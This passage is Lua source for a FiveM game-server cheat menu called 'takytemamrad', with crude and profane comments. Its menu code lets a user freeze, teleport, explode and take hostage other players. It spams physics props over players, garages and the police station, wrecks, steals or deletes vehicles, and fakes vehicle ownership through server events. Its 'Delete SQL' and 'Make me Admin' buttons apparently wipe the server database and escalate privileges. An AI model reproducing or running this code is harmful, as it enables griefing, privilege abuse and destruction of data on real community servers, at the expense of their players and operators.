                TeleportToPlayerVehicle(SelectedPlayer)
            end

			if takytemamrad.Button('<font color="#66666A">Teleport Player To Me', '<font color="#D82A2A">Server') then takytemamrad.BringOne(SelectedPlayer) end     
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineCrashMenu") then	 
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineTrollMenu") then
			if takytemamrad.Button('<font color="#66666A">Freeze Player', '<font color="#4280C6">Native') then takytemamrad.FreezePlayer(SelectedPlayer) end				
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineAttachMenu") then
			if takytemamrad.ComboBox('<font color="#66666A">Attach Props', ComboOptions.PropsOnPlayers.Words, ComboOptions.PropsOnPlayers.Selected, function(selectedIndex)
                if ComboOptions.PropsOnPlayers.Selected ~= selectedIndex then
                    ComboOptions.PropsOnPlayers.Selected = selectedIndex
                end
			end) then 
						TrollProp(GetPlayerPed(selectedPlayer), ComboOptions.PropsOnPlayers.Values[ComboOptions.PropsOnPlayers.Selected])
                    end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("ESXMenuPlayer") then
			if takytemamrad.Button('<font color="#66666A">Carry Player', '<font color="#D82A2A">Server') then takytemamrad.CarryOne(SelectedPlayer) end
			if takytemamrad.Button('<font color="#66666A">Take hostage', '<font color="#D82A2A">Server') then takytemamrad.HostageOne(SelectedPlayer) end		
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineWepMenu") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MenuExplosion") then
			if takytemamrad.CheckBox('<font color="#D82A2A">Explosion Bullets All', ExplosionBulletsALL, function(enabled)ExplosionBulletsALL = enabled end) then end
			if takytemamrad.Button('<font color="#D82A2A">Explode All', '<font color="#D82A2A">EXPLODE THAT SUCKERS') then
				for i = 0, 1024 do
					if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
					local coords = GetEntityCoords(GetPlayerPed(i))
					AddExplosion(coords.x+2, coords.y+2, coords.z+2, 7, 100.0, true, false, 1.0)
                end               
			end			
				--[[if takytemamrad.Button("~r~Explosion") then
					ExplosionID = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35"}
					local ExplosionID = KeyboardInput("Enter Explosion ID", "", 2)
					for i = 0, 255 do
						if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
						local coords = GetEntityCoords(GetPlayerPed(i))
						if ExplosionID then
						AddExplosion(coords.x+0.5, coords.y+0.5, coords.z+0.5, ExplosionID, 100.0, true, false, 1.0)
					end 
				end
			end]]
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MenuFun") then
			if takytemamrad.Button('<font color="#66666A">Carry All', '<font color="#D82A2A">Server') then 
			takytemamrad.CarryAll()
			end
			if takytemamrad.Button('<font color="#66666A">Teleport All Players To Me', '<font color="#D82A2A">Server') then			
			takytemamrad.BringAll() 
			end 
			if takytemamrad.Button('<font color="#66666A">Take hostage All', '<font color="#D82A2A">Server') then
			takytemamrad.HostageAll()
			end
			if takytemamrad.CheckBox('<font color="#66666A">Freeze All', FreezeAll) then
				FreezeAll = not FreezeAll
			end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MenuHack") then
			if takytemamrad.Button('<font color="#66666A"> Delete SQL', '<font color="#D82A2A">SQL') then
				takytemamrad.SQLWipe()
			end
			if takytemamrad.Button('<font color="#66666A">Make me Admin', '<font color="#D82A2A">SQL') then
				takytemamrad.AdminHaha()
			end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MenuAttach") then
			if takytemamrad.ComboBox('<font color="#66666A">Attach Props', ComboOptions.BigProps.Words, ComboOptions.BigProps.Selected, function(selectedIndex)
                if ComboOptions.BigProps.Selected ~= selectedIndex then
                    ComboOptions.BigProps.Selected = selectedIndex
                end
            end) then 
				for i = 0, 255 do
					if not allPlayersIncludeSelf and i == PlayerId() then i = i + 1 end
                    if NetworkIsPlayerActive(i) then
                        TrollProp(GetPlayerPed(i), ComboOptions.BigProps.Values[ComboOptions.BigProps.Selected])
                    end
                end
			end

			local function GarageSpamRIP(prop)
				local ec = GetHashKey(prop)
				local ed = CreateObject(ec, 230.13, -779.78, 44.2, true, true, true)
					ActivatePhysics(ed)
			end
				
			local function PlayerSpamRIP(prop)
				local hraci = GetEntityCoords(GetPlayerPed(i))
				local ec = GetHashKey(prop)
				local ed = CreateObject(ec, hraci, true, true, true)
					ActivatePhysics(ed)
			end	
			
			local function PDSpamRIP(prop)
				local ec = GetHashKey(prop)
				local ed = CreateObject(ec, 426.89, -979.99, 68.22, true, true, true)
					ActivatePhysics(ed)
			end

			if takytemamrad.ComboBox('<font color="#66666A">Spam Garages', ComboOptions.BrikuleNaGarazich.Words, ComboOptions.BrikuleNaGarazich.Selected, function(selectedIndex)
				if ComboOptions.BrikuleNaGarazich.Selected ~= selectedIndex then
					ComboOptions.BrikuleNaGarazich.Selected = selectedIndex
				end
			end) then	
				for i = 0, 255 do
					if NetworkIsPlayerActive(i) then
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						Wait(250)
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
						GarageSpamRIP(ComboOptions.BrikuleNaGarazich.Values[ComboOptions.BrikuleNaGarazich.Selected])
					end
				end
			end	
				


        if takytemamrad.ComboBox('<font color="#66666A">Spam Players', ComboOptions.BrikuleNaHracich.Words, ComboOptions.BrikuleNaHracich.Selected, function(selectedIndex)
				if ComboOptions.BrikuleNaHracich.Selected ~= selectedIndex then
					ComboOptions.BrikuleNaHracich.Selected = selectedIndex
				end
			end) then	
				for i = 0, 255 do
					if NetworkIsPlayerActive(i) then
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						Wait(250)
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
						PlayerSpamRIP(ComboOptions.BrikuleNaHracich.Values[ComboOptions.BrikuleNaHracich.Selected])
					end
				end
			end

			if takytemamrad.ComboBox('<font color="#66666A">Spam PD', ComboOptions.BrikuleNaPD.Words, ComboOptions.BrikuleNaPD.Selected, function(selectedIndex)
				if ComboOptions.BrikuleNaPD.Selected ~= selectedIndex then
					ComboOptions.BrikuleNaPD.Selected = selectedIndex
				end
			end) then	
				for i = 0, 255 do
					if NetworkIsPlayerActive(i) then
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						Wait(250)
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
						PDSpamRIP(ComboOptions.BrikuleNaPD.Values[ComboOptions.BrikuleNaPD.Selected])
					end
				end
			end


			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineWepCategory") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineMeleeWeapons") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineSidearmWeapons") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineAutorifleWeapons") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineShotgunWeapons") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineVehicleMenuPlayer") then
			takytemamrad.SetSubTitle("OnlineVehicleMenuPlayer", "Vehicle Options [" .. GetPlayerName(SelectedPlayer) .. "]")
			if takytemamrad.Button('<font color="#66666A">Spawn Vehicle', '<font color="#4280C6">Native') then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = KeyboardInput('<font color="#4280C6">Enter Vehicle Model Name', "", 12)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(GetPlayerPed(SelectedPlayer)), GetEntityHeading(GetPlayerPed(SelectedPlayer)), true, true)
					
					RequestControlOnce(ped)
					SetPedIntoVehicle(ped, veh, -1)
					TaskWarpPedIntoVehicle(ped, veh, -1)
					takytemamrad.SendNotification({text = NotifyFormat("Vehicle spawned ~c~%s ~s~on ~c~%s", string.lower(GetDisplayNameFromVehicleModel(ModelName)), GetPlayerName(SelectedPlayer)), type = "info"})
				else
					takytemamrad.SendNotification({text = "Invalid model", type = "error"})
				end
			end
			if takytemamrad.Button('<font color="#66666A">Give Vehicle', '<font color="#33F418">ESX') then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = KeyboardInput('<font color="#4280C6">Enter Vehicle Spawn Name', "", 20)
				local newPlate =  KeyboardInput('<font color="#4280C6">Enter Vehicle License Plate', "", 8)

				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					SetVehicleNumberPlateText(veh, newPlate)
					local vehicleProps = Cya.Game.GetVehicleProperties(veh)
					BLOWMYDICK('esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
					BLOWMYDICK('esx_givecarkeys:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
					BLOWMYDICK('garage:addKeys', newPlate)
					SetPedIntoVehicle(GetPlayerPed(SelectedPlayer), veh, -1)
				else
					takytemamrad.SendNotification({ text = "Vehicle " .. ModelName .. " does not exist!", type = "error"})
				end
			end
			if takytemamrad.Button('<font color="#66666A">Kick Player From Vehicle', '<font color="#4280C6">Native') then
				ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
			end
			if takytemamrad.Button('<font color="#66666A">Delete Vehicle', '<font color="#4280C6">Native') then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local veh = GetVehiclePedIsIn(playerPed)
				RemoveVehicle(veh)
			end
			if takytemamrad.Button('<font color="#66666A">Destroy Engine', '<font color="#4280C6">Native') then

				local playerPed = GetPlayerPed(SelectedPlayer)
				local playerVeh = GetVehiclePedIsUsing(playerPed)
				local vehNet = VehToNet(playerVeh)
				NetworkRequestControlOfNetworkId(vehNet)
				playerVeh = NetToVeh(vehNet)
				NetworkRequestControlOfEntity(playerVeh)

				RequestControlOnce(playerVeh)

				--SetVehicleUndriveable(veh, true)
				SetVehicleEngineHealth(playerVeh, 0)
			end
			if takytemamrad.Button('<font color="#66666A">Steal Vehicle', '<font color="#4280C6">Native') then

				local ped = GetPlayerPed(SelectedPlayer)
				local vehicle = GetVehiclePedIsUsing(ped)
				local StealVehicleThread = StealVehicle(vehicle)
				CreateThreadNow(StealVehicleThread)
			end

			if takytemamrad.Button('<font color="#66666A">Repair Vehicle', '<font color="#4280C6">Native') then
				local ped = GetPlayerPed(SelectedPlayer)
				local vehicle = GetVehiclePedIsUsing(ped)
				RepairVehicle(vehicle)
			end

			if takytemamrad.Button('<font color="#66666A">Repair Engine', '<font color="#4280C6">Native') then
				local ped = GetPlayerPed(SelectedPlayer)
				local vehicle = GetVehiclePedIsUsing(ped)
				RepairEngine(vehicle)
			end

			if takytemamrad.Button('<font color="#66666A">Vandalize Car', '<font color="#4280C6">Native') then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
				local vehNet = VehToNet(playerVeh)
				NetworkRequestControlOfNetworkId(vehNet)
				playerVeh = NetToVeh(vehNet)
				NetworkRequestControlOfEntity(playerVeh)
				StartVehicleAlarm(playerVeh)
				DetachVehicleWindscreen(playerVeh)
				SmashVehicleWindow(playerVeh, 0)
				SmashVehicleWindow(playerVeh, 1)
				SmashVehicleWindow(playerVeh, 2)
				SmashVehicleWindow(playerVeh, 3)
				SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
				SetVehicleDoorBroken(playerVeh, 0, true)
				SetVehicleDoorBroken(playerVeh, 1, true)
				SetVehicleDoorBroken(playerVeh, 2, true)
				SetVehicleDoorBroken(playerVeh, 3, true)
				SetVehicleDoorBroken(playerVeh, 4, true)
				SetVehicleDoorBroken(playerVeh, 5, true)
				SetVehicleDoorBroken(playerVeh, 6, true)
				SetVehicleDoorBroken(playerVeh, 7, true)
				SetVehicleLights(playerVeh, 1)
				Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
				SetVehicleNumberPlateTextIndex(playerVeh, 5)
				SetVehicleNumberPlateText(playerVeh, "CK Gang")
				SetVehicleDirtLevel(playerVeh, 10.0)
				SetVehicleModColor_1(playerVeh, 1)
				SetVehicleModColor_2(playerVeh, 1)
				SetVehicleCustomPrimaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b) -- r = 231, g = 76, b = 60
				SetVehicleCustomSecondaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b)
				SetVehicleBurnout(playerVeh, true)
				takytemamrad.SendNotification("You fucking destroyed that!")
			end

			for i, mods in pairs(LSC.vehicleMods) do
				if mods.meta == "modHorns" then
					if takytemamrad.IsMenuOpened(mods.meta) then
						for j = 0, 51, 1 do
							if j == currentMods[mods.meta] then
								if takytemamrad.Button(LSC.GetHornName(j), "Installed", nil, _menuColor.base) then 
									RemoveVehicleMod(Cya.Player.Vehicle, mods.id)
									LSC.UpdateMods()
								end
							else
								if takytemamrad.Button(LSC.GetHornName(j), "Not Installed") then 
									SetVehicleMod(Cya.Player.Vehicle, mods.id, j)
									LSC.UpdateMods()
								end
							end
						end
						takytemamrad.Display()
					end
				elseif mods.meta == "modFrontWheels" or mods.meta == "modBackWheels" then
					if takytemamrad.IsMenuOpened(mods.meta) then
						local modCount = GetNumVehicleMods(Cya.Player.Vehicle, mods.id)
						for j = 0, modCount, 1 do
							local modName = GetModTextLabel(Cya.Player.Vehicle, mods.id, j)
							if modName then
								if j == currentMods[mods.meta] then
									if takytemamrad.Button(GetLabelText(modName), "Installed", nil, _menuColor.base) then 
										RemoveVehicleMod(Cya.Player.Vehicle, mods.id)
										LSC.UpdateMods()
									end
								else
									if takytemamrad.Button(GetLabelText(modName), "Not Installed") then 
										SetVehicleMod(Cya.Player.Vehicle, mods.id, j)
										LSC.UpdateMods()
									end
								end
							end
						end
						takytemamrad.Display()
					end
				else
					if takytemamrad.IsMenuOpened(mods.meta) then
						local modCount = GetNumVehicleMods(Cya.Player.Vehicle, mods.id)
						for j = 0, modCount, 1 do
							local modName = GetModTextLabel(Cya.Player.Vehicle, mods.id, j)
							if modName then
								if j == currentMods[mods.meta] then
									if takytemamrad.Button(GetLabelText(modName), "Installed", nil, _menuColor.base) then 
										RemoveVehicleMod(Cya.Player.Vehicle, mods.id)
										LSC.UpdateMods()
									end
								else
									if takytemamrad.Button(GetLabelText(modName), "Not Installed") then 
										SetVehicleMod(Cya.Player.Vehicle, mods.id, j)
										LSC.UpdateMods()
									end
								end
							end
						end
						takytemamrad.Display()
					end
				end
			end
		end
			
			Wait(0)
		end
	end
CreateThread(MenuRuntimeThread)

function GateKeep()
	if _gatekeeper then
			takytemamrad.OpenMenu("takytemamradMainMenu")
	end
end

-- she say that her pussy wet so i'ma 

local LogoScreen = function()

	local dui3 = GetDuiHandle(CreateDui('https://imgur.com/g3rru7L.gif', 1920, 1080))

 CreateRuntimeTextureFromDuiHandle(CreateRuntimeTxd('wave'), 'logo', dui3)


 for i = 1, 255 / 2 do


	 local alpha = math.floor(255 - i * 2)

	 local timer = GetGameTimer() + 47

 while timer >= GetGameTimer() do

	 DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 255, alpha)

	 Wait(0)

 		end

	end
end


CreateThread(LogoScreen)